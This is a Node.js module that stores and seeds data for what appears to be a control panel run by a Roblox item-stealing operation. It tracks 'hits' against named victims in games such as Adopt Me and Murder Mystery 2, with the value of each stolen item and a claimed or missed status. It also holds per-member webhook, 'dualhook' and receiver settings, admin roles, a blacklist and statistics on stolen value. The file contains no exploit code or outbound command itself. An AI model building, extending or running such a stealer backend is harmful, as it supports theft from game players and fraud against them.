import { randomBytes, randomUUID, createHash } from 'node:crypto';
import { readFileSync, writeFileSync, mkdirSync, existsSync, renameSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = dirname(dirname(fileURLToPath(import.meta.url)));
const DATA_DIR = join(ROOT, 'data');
const DB_PATH = join(DATA_DIR, 'db.json');

export const GAMES = [
  { id: 'mm2', name: 'Murder Mystery 2', short: 'MM2' },
  { id: 'adm', name: 'Adopt Me', short: 'ADM' },
  { id: 'baddies', name: 'Baddies', short: 'BADDIES' },
  { id: 'gag2', name: 'Grow a Garden 2', short: 'GAG2' },
  { id: 'sab', name: 'Steal a Brainrot', short: 'SAB' },
];

export const gameName = (id) => GAMES.find((g) => g.id === id)?.name ?? id;

const now = () => Date.now();
const token = (n = 24) => randomBytes(n).toString('hex');
const hashCode = (s) => createHash('sha256').update(s).digest('hex');

// ---------- seed ----------
const FIRST = ['vex', 'lunar', 'kryo', 'nyx', 'zeph', 'onyx', 'rune', 'sable', 'nova', 'vexed',
  'haunt', 'duke', 'void', 'moth', 'cinder', 'ember', 'ghost', 'thorn', 'wraith', 'echo',
  'slick', 'jinx', 'havoc', 'blitz', 'crash', 'dusk', 'frost', 'grit', 'hex', 'iris',
  'jolt', 'kilo', 'lynx', 'maze', 'neon', 'opal', 'pyre', 'quartz', 'riven', 'shade',
  'tide', 'umbra', 'volt', 'wick', 'xeno', 'yield', 'zinc', 'abyss', 'brine', 'cobalt'];
const SECOND = ['wastes', 'main', 'core', 'alt', 'hub', 'trade', 'farm', 'grind', 'snipes', 'vault',
  'run', 'ops', 'lab', 'depot', 'cell', 'den', 'pit', 'row', 'syn', 'net'];

const ITEMS = {
  mm2: ['Chroma Darkbringer', 'Chroma Lightbringer', 'Elderwood Revolver', 'Traveler’s Gun',
    'Corrupt Set', 'Amerilaser', 'Batwing', 'Candleflame', 'Deathshard', 'Icebreaker',
    'Lugercane', 'Minty', 'Nebula', 'Phantom', 'Saw', 'Snowflake', 'Sugar', 'Vampire’s Edge'],
  adm: ['Shadow Dragon', 'Frost Dragon', 'Bat Dragon', 'Giraffe', 'Owl', 'Parrot',
    'Mega Neon Unicorn', 'Neon Evil Unicorn', 'Arctic Reindeer', 'Crow', 'Kangaroo', 'Turtle'],
  baddies: ['Baddie Bundle', 'Aura Crate', 'Mythic Crate', 'Golden Crate', 'Trait Reroll',
    'Luck Boost', 'Damage Boost', 'Exclusive Skin', 'Crystal Pack', 'Rebirth Token'],
  gag2: ['Golden Watering Can', 'Mythic Seed Pack', 'Rainbow Sprinkler', 'Honey Sprinkler',
    'Super Sprinkler', 'Moon Bloom Seed', 'Star Fruit Seed', 'Dragon Fruit Seed'],
  sab: ['Headless Horseman', 'Graipuss Medussi', 'Tung Tung Tung Sahur', 'Bombardiro Crocodilo',
    'Lirili Larila', 'Brr Brr Patapim', 'Chimpanzini Bananini', 'Cappuccino Assassino'],
};

const VALUE_RANGE = {
  mm2: [40, 9000], adm: [30, 24000], baddies: [5, 900], gag2: [10, 4000], sab: [8, 5200],
};

const rand = (min, max) => min + Math.random() * (max - min);
const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];

function seed() {
  const users = [];
  const hits = [];
  const t0 = now();

  const mkUser = (username, role = 'member') => {
    const id = randomUUID();
    const created = t0 - Math.floor(rand(1, 90)) * 86400000;
    return {
      id,
      username,
      display: username,
      avatar: null,
      role,
      banned: false,
      ban_reason: null,
      discord_id: String(Math.floor(rand(1e17, 9e17))),
      webhook_token: token(18),
      api_key: `syn_${token(16)}`,
      created_at: created,
      last_seen: t0 - Math.floor(rand(0, 72)) * 3600000,
      config: { webhook: null, dualhook: null, receivers: [], dualhook_enabled: false, min_value: 1 },
      delivery: { last_at: null, last_ok: null, last_error: null, count: 0 },
    };
  };

  users.push(mkUser('syn', 'admin'));
  users.push(mkUser('onyx', 'admin'));
  for (let i = 0; i < 148; i += 1) {
    users.push(mkUser(`${pick(FIRST)}${Math.random() > 0.55 ? pick(SECOND) : ''}${Math.random() > 0.7 ? Math.floor(rand(10, 99)) : ''}`));
  }
  const seen = new Set();
  const uniq = users.filter((u) => (seen.has(u.username) ? false : seen.add(u.username)));

  for (const u of uniq) {
    const count = Math.floor(rand(0, 90));
    for (let i = 0; i < count; i += 1) {
      const game = pick(GAMES).id;
      const [lo, hi] = VALUE_RANGE[game];
      const created = t0 - Math.floor(rand(0, 14 * 86400000));
      hits.push({
        id: randomUUID(),
        user_id: u.id,
        game,
        item: pick(ITEMS[game]),
        victim: `${pick(FIRST)}${Math.floor(rand(1, 999))}`,
        value: Math.round(rand(lo, hi) * 100) / 100,
        status: pick(['claimed', 'claimed', 'claimed', 'pending', 'partial', 'missed']),
        created_at: created,
      });
    }
  }
  hits.sort((a, b) => b.created_at - a.created_at);

  const blacklist = [
    { id: randomUUID(), username: 'xX_scammer_Xx', reason: 'Chargeback abuse', created_at: t0 - 86400000 * 6, added_by: 'syn' },
    { id: randomUUID(), username: 'freeitemspls', reason: 'Spamming the hit feed', created_at: t0 - 86400000 * 3, added_by: 'onyx' },
    { id: randomUUID(), username: 'altfarm99', reason: 'Alt farming', created_at: t0 - 86400000 * 1, added_by: 'syn' },
  ];

  return {
    version: 1,
    created_at: t0,
    users: uniq,
    hits,
    blacklist,
    sessions: {},
    meta: { seeded_at: t0 },
  };
}

// ---------- store ----------
export function createStore() {
  if (!existsSync(DATA_DIR)) mkdirSync(DATA_DIR, { recursive: true });

  let db;
  if (!existsSync(DB_PATH) && process.env.SEED === '0') {
    db = { version: 1, created_at: Date.now(), users: [], hits: [], blacklist: [], sessions: {}, meta: { seeded_at: null } };
    writeFileSync(DB_PATH, JSON.stringify(db));
  } else if (existsSync(DB_PATH)) {
    db = JSON.parse(readFileSync(DB_PATH, 'utf8'));
    for (const u of db.users) {
      u.config ??= {};
      u.config.webhook ??= null;
      u.config.dualhook ??= null;
      u.config.receivers ??= [];
      u.config.dualhook_enabled ??= false;
      u.config.min_value ??= 1;
      u.delivery ??= { last_at: null, last_ok: null, last_error: null, count: 0 };
    }
  } else {
    db = seed();
    writeFileSync(DB_PATH, JSON.stringify(db));
  }

  let flushTimer = null;
  let dirty = false;

  const flush = () => {
    if (!dirty) return;
    dirty = false;
    const tmp = `${DB_PATH}.tmp`;
    writeFileSync(tmp, JSON.stringify(db));
    renameSync(tmp, DB_PATH);
  };

  const touch = () => {
    dirty = true;
    if (flushTimer) return;
    flushTimer = setTimeout(() => { flushTimer = null; flush(); }, 200);
  };

  const listeners = new Set();

  return {
    raw: () => db,

    userById: (id) => db.users.find((u) => u.id === id) ?? null,
    userByUsername: (name) => db.users.find((u) => u.username.toLowerCase() === String(name).toLowerCase()) ?? null,
    userByToken: (t) => db.users.find((u) => u.webhook_token === t) ?? null,
    userByDiscord: (d) => db.users.find((u) => u.discord_id === String(d)) ?? null,

    createUser({ username, discord_id = null, avatar = null, role = 'member' }) {
      const u = {
        id: randomUUID(),
        username,
        display: username,
        avatar,
        role,
        banned: false,
        ban_reason: null,
        discord_id,
        webhook_token: token(18),
        api_key: `syn_${token(16)}`,
        created_at: now(),
        last_seen: now(),
        config: { webhook: null, dualhook: null, receivers: [], dualhook_enabled: false, min_value: 1 },
        delivery: { last_at: null, last_ok: null, last_error: null, count: 0 },
      };
      db.users.push(u);
      touch();
      return u;
    },

    saveUser(u) { touch(); return u; },

    hits: () => db.hits,

    addHit(hit) {
      db.hits.unshift(hit);
      if (db.hits.length > 40000) db.hits.length = 40000;
      touch();
      for (const l of listeners) l(hit);
      return hit;
    },

    removeHit(id) {
      const i = db.hits.findIndex((h) => h.id === id);
      if (i === -1) return false;
      db.hits.splice(i, 1);
      touch();
      return true;
    },

    clearHits(userId) {
      const before = db.hits.length;
      db.hits = db.hits.filter((h) => h.user_id !== userId);
      touch();
      return before - db.hits.length;
    },

    blacklist: () => db.blacklist,
    isBlacklisted(username) {
      return db.blacklist.some((b) => b.username.toLowerCase() === String(username).toLowerCase());
    },
    addBlacklist(entry) { db.blacklist.unshift(entry); touch(); return entry; },
    removeBlacklist(id) {
      const i = db.blacklist.findIndex((b) => b.id === id);
      if (i === -1) return false;
      db.blacklist.splice(i, 1);
      touch();
      return true;
    },

    sessions: () => db.sessions,
    createSession(userId) {
      const s = token(32);
      db.sessions[hashCode(s)] = { user_id: userId, created_at: now() };
      touch();
      return s;
    },
    sessionUser(raw) {
      if (!raw) return null;
      const rec = db.sessions[hashCode(raw)];
      if (!rec) return null;
      if (now() - rec.created_at > 30 * 86400000) {
        delete db.sessions[hashCode(raw)];
        touch();
        return null;
      }
      return this.userById(rec.user_id);
    },
    destroySession(raw) {
      if (!raw) return;
      delete db.sessions[hashCode(raw)];
      touch();
    },

    onHit(fn) { listeners.add(fn); return () => listeners.delete(fn); },

    stats() {
      const dayStart = new Date();
      dayStart.setHours(0, 0, 0, 0);
      const perGame = new Map(GAMES.map((g) => [g.id, { game: g.id, hits: 0, value: 0 }]));
      let totalValue = 0;
      let today = 0;
      for (const h of db.hits) {
        const row = perGame.get(h.game);
        if (row) { row.hits += 1; row.value += h.value; }
        totalValue += h.value;
        if (h.created_at >= dayStart.getTime()) today += 1;
      }
      return {
        total_hits: db.hits.length,
        total_users: db.users.length,
        total_value: Math.round(totalValue * 10000) / 10000,
        hits_today: today,
        games: [...perGame.values()],
        blacklisted: db.blacklist.length,
        banned: db.users.filter((u) => u.banned).length,
        online: Math.max(1, Math.round(db.users.length * 0.06)),
      };
    },

    series(hours = 24, bucketMinutes = 60) {
      const end = now();
      const start = end - hours * 3600000;
      const buckets = Math.ceil((hours * 60) / bucketMinutes);
      const out = Array.from({ length: buckets }, (_, i) => {
        const at = start + i * bucketMinutes * 60000;
        const d = new Date(at);
        const label = bucketMinutes >= 1440
          ? d.toLocaleDateString(undefined, { month: 'short', day: 'numeric' })
          : `${String(d.getHours()).padStart(2, '0')}:${String(d.getMinutes()).padStart(2, '0')}`;
        return { label, at, hits: 0 };
      });
      for (const h of db.hits) {
        if (h.created_at < start) continue;
        const idx = Math.min(buckets - 1, Math.floor((h.created_at - start) / (bucketMinutes * 60000)));
        if (idx >= 0) out[idx].hits += 1;
      }
      return out;
    },

    flush,
  };
}
